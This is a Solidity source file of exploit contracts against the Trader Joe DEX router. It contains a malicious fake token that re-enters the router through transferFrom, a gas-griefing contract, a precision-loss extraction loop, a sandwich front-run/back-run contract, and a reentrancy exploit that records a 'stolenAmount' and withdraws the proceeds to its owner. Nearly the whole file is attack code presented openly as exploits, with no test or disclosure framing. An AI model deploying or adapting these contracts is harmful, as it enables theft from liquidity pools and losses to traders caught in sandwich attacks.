// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Interfaces.sol";

/**
 * @title MaliciousToken
 * @dev Token implementation that exploits cross-contract reentrancy in Trader Joe router
 * It takes advantage of the router's pattern of reading state before external calls
 * and writing state after external calls.
 */
contract MaliciousToken {
    address public router;
    address public owner;
    address public wavax;
    bool public attacking = false;
    uint public attackCount = 0;
    uint public maxAttacks = 3;

    event AttackExecuted(uint count, address target);

    constructor(address _router, address _wavax) {
        router = _router;
        wavax = _wavax;
        owner = msg.sender;
    }

    // ERC20 interface methods
    function name() external pure returns (string memory) {
        return "Malicious Token";
    }

    function symbol() external pure returns (string memory) {
        return "MTKN";
    }

    function decimals() external pure returns (uint8) {
        return 18;
    }

    function totalSupply() external pure returns (uint256) {
        return 1000000 * 10**18;
    }

    function balanceOf(address) external pure returns (uint256) {
        return 1000000 * 10**18; // Always return a large balance
    }

    function transfer(address, uint256) external pure returns (bool) {
        return true; // Always succeed
    }

    function allowance(address, address) external pure returns (uint256) {
        return type(uint256).max; // Always approve max
    }

    function approve(address, uint256) external pure returns (bool) {
        return true; // Always succeed
    }

    // This is where the reentrancy happens
    function transferFrom(address, address, uint256 amount) external returns (bool) {
        // Only reenter if we're attacking and the caller is the router
        if (attacking && msg.sender == router && attackCount < maxAttacks) {
            attackCount++;

            // Create path for swap
            address[] memory path = new address[](2);
            path[0] = wavax;
            path[1] = address(this);

            emit AttackExecuted(attackCount, msg.sender);

            // Call back into router - this is the reentrant call
            // The router will use stale state (before updating pool balances)
            ITraderJoeRouter(router).swapExactTokensForTokens(
                amount, // Amount doesn't matter, we're a fake token
                0,      // No slippage protection
                path,
                address(this),
                block.timestamp + 3600
            );
        }

        return true; // Always succeed
    }

    // Start the attack
    function startAttack(address tokenIn, uint256 amount) external {
        require(msg.sender == owner, "Only owner");
        require(IERC20(tokenIn).allowance(address(this), router) >= amount, "Approve needed");

        // Setup path
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = address(this);

        // Enable attack mode
        attacking = true;
        attackCount = 0;

        // Initial swap to trigger the attack
        ITraderJoeRouter(router).swapExactTokensForTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp + 3600
        );

        // Disable attack mode
        attacking = false;
    }

    // Withdraw tokens
    function withdraw(address token) external {
        require(msg.sender == owner, "Only owner");
        uint256 balance = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(owner, balance);
    }

    // Receive ETH
    receive() external payable {}
}

/**
 * @title GasGriefingExploit
 * @dev Contract that exploits the gas griefing vulnerability in Trader Joe router
 * Takes advantage of the router's unbounded gas forwarding to external contracts
 */
contract GasGriefingExploit {
    uint public gasUsed;
    bool public shouldConsume = true;
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function toggleGasConsumption(bool _shouldConsume) external {
        require(msg.sender == owner, "Only owner");
        shouldConsume = _shouldConsume;
    }

    // Consume all gas in fallback
    fallback() external {
        if (shouldConsume) {
            uint startGas = gasleft();
            bytes32 hash = keccak256(abi.encodePacked(block.timestamp));

            // Loop until almost all gas is consumed
            while (gasleft() > 2000) {
                hash = keccak256(abi.encodePacked(hash));
            }

            gasUsed = startGas - gasleft();
        }
    }

    // Receive function with same gas-consuming logic
    receive() external payable {
        if (shouldConsume) {
            uint startGas = gasleft();
            bytes32 hash = keccak256(abi.encodePacked(block.timestamp));

            // Loop until almost all gas is consumed
            while (gasleft() > 2000) {
                hash = keccak256(abi.encodePacked(hash));
            }

            gasUsed = startGas - gasleft();
        }
    }

    // Allow owner to withdraw any tokens
    function withdraw(address token) external {
        require(msg.sender == owner, "Only owner");
        if (token == address(0)) {
            payable(owner).transfer(address(this).balance);
        } else {
            uint256 balance = IERC20(token).balanceOf(address(this));
            IERC20(token).transfer(owner, balance);
        }
    }
}

/**
 * @title PrecisionLossExploit
 * @dev Contract that demonstrates and exploits precision loss in Trader Joe router
 * Takes advantage of the router's pattern of dividing before multiplying
 */
contract PrecisionLossExploit {
    address public router;
    address public owner;

    event PrecisionLossDetected(uint expectedAmount, uint actualAmount, uint loss);

    constructor(address _router) {
        router = _router;
        owner = msg.sender;
    }

    // Calculate the expected output without precision loss
    function calculatePreciseOutput(
        uint amountIn,
        uint reserveIn,
        uint reserveOut
    ) public pure returns (uint) {
        // Apply 0.3% fee
        uint amountInWithFee = amountIn * 997;

        // Multiplication before division (avoids precision loss)
        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }

    // Find an amount that would cause significant precision loss
    function findVulnerableAmount(
        address token0,
        address token1
    ) external view returns (uint256 amount, uint256 expectedPrecisionLoss) {
        // Get the factory from the router
        ITraderJoeRouter tjRouter = ITraderJoeRouter(router);
        ITraderJoeFactory factory = ITraderJoeFactory(tjRouter.factory());

        // Get the pair
        address pairAddress = factory.getPair(token0, token1);
        require(pairAddress != address(0), "Pair not found");

        ITraderJoePair pair = ITraderJoePair(pairAddress);
        (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();

        // Determine which token is which in the pair
        bool isToken0First = pair.token0() == token0;
        uint reserveIn = isToken0First ? reserve0 : reserve1;
        uint reserveOut = isToken0First ? reserve1 : reserve0;

        // Find an amount that causes precision loss
        // We're looking for a case where (amountIn * 997) / (reserveIn * 1000 + amountIn * 997) truncates to zero
        // but the multiplication-first approach gives a non-zero result

        // Start with a very small amount
        uint testAmount = reserveIn / 1000000;

        while (testAmount < reserveIn / 1000) {
            // Calculate using router's method (vulnerable to precision loss)
            uint routerOut = tjRouter.getAmountOut(testAmount, reserveIn, reserveOut);

            // Calculate precise output
            uint preciseOut = calculatePreciseOutput(testAmount, reserveIn, reserveOut);

            // If there's a difference, we found a vulnerable amount
            if (preciseOut > routerOut) {
                return (testAmount, preciseOut - routerOut);
            }

            // Increase test amount
            testAmount = testAmount * 2;
        }

        return (0, 0); // No vulnerable amount found
    }

    // Execute multiple precision loss trades to extract value
    function executePrecisionLossAttack(
        address tokenIn,
        address tokenOut,
        uint256 amount,
        uint8 iterations
    ) external {
        require(msg.sender == owner, "Only owner");
        require(iterations <= 10, "Too many iterations");

        // Approve router to spend our tokens
        IERC20(tokenIn).approve(router, amount * iterations);

        ITraderJoeRouter tjRouter = ITraderJoeRouter(router);

        uint totalIn = 0;
        uint totalOut = 0;

        for (uint8 i = 0; i < iterations; i++) {
            // Create path
            address[] memory path = new address[](2);
            path[0] = tokenIn;
            path[1] = tokenOut;

            // Execute swap
            uint[] memory amounts = tjRouter.swapExactTokensForTokens(
                amount,
                0, // No slippage protection
                path,
                address(this),
                block.timestamp + 3600
            );

            totalIn += amounts[0];
            totalOut += amounts[1];
        }

        // Report results
        emit PrecisionLossDetected(
            totalIn * 997 / 1000, // Expected output (simplified)
            totalOut,
            totalIn * 997 / 1000 > totalOut ? totalIn * 997 / 1000 - totalOut : 0
        );
    }

    // Withdraw tokens
    function withdraw(address token) external {
        require(msg.sender == owner, "Only owner");
        uint256 balance = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(owner, balance);
    }

    // Receive ETH
    receive() external payable {}
}

/**
 * @title SandwichAttackExploit
 * @dev Contract that demonstrates sandwich attack vulnerability in Trader Joe router
 * Takes advantage of the lack of slippage protection enforcement
 */
contract SandwichAttackExploit {
    address public router;
    address public owner;

    event SandwichExecuted(
        uint frontrunProfit,
        uint victimLoss,
        uint backrunProfit,
        uint totalProfit
    );

    constructor(address _router) {
        router = _router;
        owner = msg.sender;
    }

    // Helper function to execute frontrun
    function _executeFrontrun(
        address tokenIn,
        address tokenOut,
        uint256 attackerAmount
    ) private returns (uint frontrunOut, uint tokenInUsed) {
        // Create path
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;

        uint tokenOutBalanceBefore = IERC20(tokenOut).balanceOf(address(this));

        uint[] memory frontrunAmounts = ITraderJoeRouter(router).swapExactTokensForTokens(
            attackerAmount,
            0, // No slippage protection
            path,
            address(this),
            block.timestamp + 3600
        );

        uint tokenOutAfterFrontrun = IERC20(tokenOut).balanceOf(address(this));
        frontrunOut = tokenOutAfterFrontrun - tokenOutBalanceBefore;
        tokenInUsed = frontrunAmounts[0];

        return (frontrunOut, tokenInUsed);
    }

    // Helper function to calculate victim loss
    function _calculateVictimLoss(
        address tokenIn,
        address tokenOut,
        uint256 victimAmount
    ) private view returns (uint victimLoss) {
        // Get expected output with current state
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;

        uint[] memory victimExpectedAmounts = ITraderJoeRouter(router).getAmountsOut(victimAmount, path);
        uint victimExpectedOut = victimExpectedAmounts[1];

        // Calculate what victim would have received without our interference
        ITraderJoeFactory factory = ITraderJoeFactory(ITraderJoeRouter(router).factory());
        address pairAddress = factory.getPair(tokenIn, tokenOut);
        ITraderJoePair pair = ITraderJoePair(pairAddress);
        (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();

        bool isToken0First = pair.token0() == tokenIn;
        uint reserveIn = isToken0First ? reserve0 : reserve1;
        uint reserveOut = isToken0First ? reserve1 : reserve0;

        // Calculate fair output for victim (before our interference)
        uint fairVictimOut = (victimAmount * 997 * reserveOut) / 
                             (reserveIn * 1000 + victimAmount * 997);

        victimLoss = fairVictimOut > victimExpectedOut ? 
                    fairVictimOut - victimExpectedOut : 0;

        return victimLoss;
    }

    // Helper function to execute backrun
    function _executeBackrun(
        address tokenIn,
        address tokenOut,
        uint frontrunOut,
        uint initialInvestment
    ) private returns (uint backrunProfit, uint totalProfit) {
        // Reverse the path
        address[] memory reversePath = new address[](2);
        reversePath[0] = tokenOut;
        reversePath[1] = tokenIn;

        // Approve and sell all tokenOut we acquired in the front-run
        IERC20(tokenOut).approve(router, frontrunOut);

        uint tokenInBefore = IERC20(tokenIn).balanceOf(address(this));

        ITraderJoeRouter(router).swapExactTokensForTokens(
            frontrunOut,
            0, // No slippage protection
            reversePath,
            address(this),
            block.timestamp + 3600
        );

        uint tokenInAfter = IERC20(tokenIn).balanceOf(address(this));
        uint backrunOut = tokenInAfter - tokenInBefore;

        backrunProfit = backrunOut;
        totalProfit = tokenInAfter > initialInvestment ? 
                     tokenInAfter - initialInvestment : 0;

        return (backrunProfit, totalProfit);
    }

    // Simulate a sandwich attack (front-run + back-run)
    function simulateSandwich(
        address tokenIn,
        address tokenOut,
        uint256 victimAmount,
        uint256 attackerAmount
    ) external {
        require(msg.sender == owner, "Only owner");
        require(attackerAmount <= IERC20(tokenIn).balanceOf(address(this)), "Insufficient balance");

        // Approve router to spend our tokens
        IERC20(tokenIn).approve(router, attackerAmount * 2);

        // Record initial investment
        uint initialInvestment = IERC20(tokenIn).balanceOf(address(this));

        // 1. Front-run: Buy tokenOut before victim
        (uint frontrunOut, ) = _executeFrontrun(tokenIn, tokenOut, attackerAmount);

        // 2. Calculate victim loss (simulated)
        uint victimLoss = _calculateVictimLoss(tokenIn, tokenOut, victimAmount);

        // 3. Back-run: Sell tokenOut after victim
        (uint backrunProfit, uint totalProfit) = _executeBackrun(
            tokenIn, 
            tokenOut, 
            frontrunOut, 
            initialInvestment
        );

        emit SandwichExecuted(
            frontrunOut,
            victimLoss,
            backrunProfit,
            totalProfit
        );
    }

    // Withdraw tokens
    function withdraw(address token) external {
        require(msg.sender == owner, "Only owner");
        uint256 balance = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(owner, balance);
    }

    // Receive ETH
    receive() external payable {}
}

/**
 * @title TraderJoeReentrancyExploit
 * @dev Complete implementation for cross-contract reentrancy exploit
 */
contract TraderJoeReentrancyExploit {
    address public router;
    address public wavax;
    address public owner;
    uint public stolenAmount;
    bool public isExploiting = false;
    uint public reentryCount = 0;
    uint public maxReentries = 3; // Prevent infinite loops

    event ExploitExecuted(uint stolenAmount, uint reentryCount);
    event FundsWithdrawn(address to, uint amount);

    constructor(address _router, address _wavax) {
        router = _router;
        wavax = _wavax;
        owner = msg.sender;
    }

    // Pretend to be an ERC20 token
    function name() external pure returns (string memory) {
        return "Exploit Token";
    }

    function symbol() external pure returns (string memory) {
        return "EXPL";
    }

    function decimals() external pure returns (uint8) {
        return 18;
    }

    // This function is called by the router during a swap
    function transferFrom(address, address, uint256 amount) external returns (bool) {
        // Only allow reentry from the router and only when we're in exploit mode
        if (isExploiting && msg.sender == router && reentryCount < maxReentries) {
            reentryCount++;

            // Create path for swap
            address[] memory path = new address[](2);
            path[0] = wavax;
            path[1] = address(this);

            // Call back into router - this is the reentrant call
            // Router will use stale state (before updating pool balances)
            ITraderJoeRouter(router).swapExactTokensForTokens(
                amount,  // Amount doesn't matter since we're a fake token
                0,       // No slippage protection
                path,
                address(this),
                block.timestamp + 3600
            );

            return true;
        }

        // Standard behavior - pretend the transfer succeeded
        return true;
    }

    // This function is also needed for the token interface
    function transfer(address, uint256) external returns (bool) {
        return true;
    }

    // Balances can be manipulated to maximize exploit
    function balanceOf(address) external view returns (uint256) {
        // Return a large balance to allow the router to complete swaps
        return 1000000 * 10**18;
    }

    // Start the exploit
    function exploit(uint256 amountIn) external {
        require(msg.sender == owner, "Only owner can exploit");
        require(IERC20(wavax).balanceOf(address(this)) >= amountIn, "Insufficient WAVAX");

        // Approve router to spend our tokens
        IERC20(wavax).approve(router, amountIn);

        // Create path for initial swap
        address[] memory path = new address[](2);
        path[0] = wavax;
        path[1] = address(this); // Our malicious token

        // Record balances before attack
        uint balanceBefore = IERC20(wavax).balanceOf(address(this));

        // Enable exploiting mode
        isExploiting = true;
        reentryCount = 0;

        // Initiate the swap that will trigger the reentrancy
        ITraderJoeRouter(router).swapExactTokensForTokens(
            amountIn,
            0, // No slippage protection
            path,
            address(this),
            block.timestamp + 3600
        );

        // Disable exploiting mode
        isExploiting = false;

        // Calculate stolen amount
        uint balanceAfter = IERC20(wavax).balanceOf(address(this));
        stolenAmount = balanceAfter > balanceBefore ? balanceAfter - balanceBefore : 0;

        emit ExploitExecuted(stolenAmount, reentryCount);
    }

    // Withdraw funds
    function withdraw() external {
        require(msg.sender == owner, "Only owner can withdraw");

        uint amount = IERC20(wavax).balanceOf(address(this));
        IERC20(wavax).transfer(owner, amount);

        emit FundsWithdrawn(owner, amount);
    }

    // Allow receiving ETH
    receive() external payable {}
}

